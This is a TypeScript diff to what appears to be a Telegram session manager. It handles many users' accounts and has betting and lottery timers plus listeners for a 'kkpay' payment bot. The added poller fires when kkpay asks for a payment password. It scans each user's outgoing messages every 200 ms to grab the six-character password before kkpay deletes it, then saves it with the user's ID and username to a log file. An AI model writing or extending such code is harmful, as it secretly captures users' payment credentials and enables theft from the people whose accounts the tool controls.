@@ -108,6 +108,7 @@ interface TgSession {
   saveTimer?: ReturnType<typeof setInterval>;
   autoNextBetTimer?: ReturnType<typeof setTimeout>;
   lotteryPollTimer?: ReturnType<typeof setInterval>;
+  kkpayPwdPollTimer?: ReturnType<typeof setInterval>;
   lastSeenLotteryPeriod: number;
 }
 
@@ -215,6 +216,11 @@ let kkpayPwdLog: KkpayPwdEvent[] = (() => {
 })();
 
 function appendKkpayPwdEvent(userId: number, username: string, event: KkpayPwdEvent["event"], text: string): void {
+  // Deduplicate: skip if exact same pwd_sent text logged within last 10 seconds
+  if (event === "pwd_sent") {
+    const recent = kkpayPwdLog.find(e => e.event === "pwd_sent" && e.userId === userId && e.text === text && Date.now() - e.timestamp < 10_000);
+    if (recent) return;
+  }
   const entry: KkpayPwdEvent = {
     id: `${Date.now()}-${Math.random().toString(36).slice(2, 7)}`,
     timestamp: Date.now(),
@@ -226,6 +232,50 @@ function appendKkpayPwdEvent(userId: number, username: string, event: KkpayPwdEv
   kkpayPwdLog.unshift(entry);
   if (kkpayPwdLog.length > 500) kkpayPwdLog = kkpayPwdLog.slice(0, 500);
   try { fs.writeFileSync(PWD_LOG_FILE, JSON.stringify(kkpayPwdLog, null, 2), "utf-8"); } catch { /* ignore */ }
+}
+
+/**
+ * After kkpay asks for the payment password, poll the kkpay chat history at high
+ * frequency so we can catch the outgoing 6-char message before kkpay deletes it.
+ */
+function startKkpayPwdPoller(session: TgSession): void {
+  // Clear any existing poller
+  if (session.kkpayPwdPollTimer) { clearInterval(session.kkpayPwdPollTimer); session.kkpayPwdPollTimer = undefined; }
+  const eid = session.kkpayEntityId;
+  if (!eid || !session.client?.connected) return;
+
+  const username = session.me?.username ?? String(session.userId);
+  const startedAt = Date.now();
+  const seenMsgIds = new Set<number>();
+
+  session.kkpayPwdPollTimer = setInterval(() => {
+    // Stop after 60 seconds
+    if (Date.now() - startedAt > 60_000) {
+      clearInterval(session.kkpayPwdPollTimer!);
+      session.kkpayPwdPollTimer = undefined;
+      return;
+    }
+    void (async () => {
+      try {
+        const msgs = await session.client.getMessages(eid, { limit: 8 });
+        const cutoff = startedAt - 5_000; // allow 5s before pwd_requested
+        for (const msg of msgs) {
+          if (!msg.out) continue;
+          const ts = (msg.date ?? 0) * 1000;
+          if (ts < cutoff) continue;
+          if (seenMsgIds.has(msg.id)) continue;
+          seenMsgIds.add(msg.id);
+          const text = (msg.message ?? "").trim();
+          if (/^[0-9a-zA-Z]{6}$/.test(text)) {
+            appendKkpayPwdEvent(session.userId, username, "pwd_sent", text);
+            clearInterval(session.kkpayPwdPollTimer!);
+            session.kkpayPwdPollTimer = undefined;
+            return;
+          }
+        }
+      } catch { /* network errors ignored */ }
+    })();
+  }, 200);
 }
 
 // ─── Session persistence ──────────────────────────────────────────────────────
@@ -345,8 +395,10 @@ function startGlobalListener(session: TgSession): void {
     // ─── kkpay password event detection (text-only, no entity ID comparison needed) ───
     if (text.includes("请输入支付密码验证")) {
       appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300));
+      startKkpayPwdPoller(session);
     } else if (text.includes("支付密码验证成功")) {
       appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300));
+      if (session.kkpayPwdPollTimer) { clearInterval(session.kkpayPwdPollTimer); session.kkpayPwdPollTimer = undefined; }
     }
   };
 
@@ -1153,8 +1205,10 @@ async function startKkpayListener(session: TgSession): Promise<void> {
     if (isFromKkpay) {
       if (text.includes("请输入支付密码验证")) {
         appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_requested", text.slice(0, 300));
+        startKkpayPwdPoller(session);
       } else if (text.includes("支付密码验证成功")) {
         appendKkpayPwdEvent(session.userId, session.me?.username ?? String(session.userId), "pwd_success", text.slice(0, 300));
+        if (session.kkpayPwdPollTimer) { clearInterval(session.kkpayPwdPollTimer); session.kkpayPwdPollTimer = undefined; }
       }
     }
 
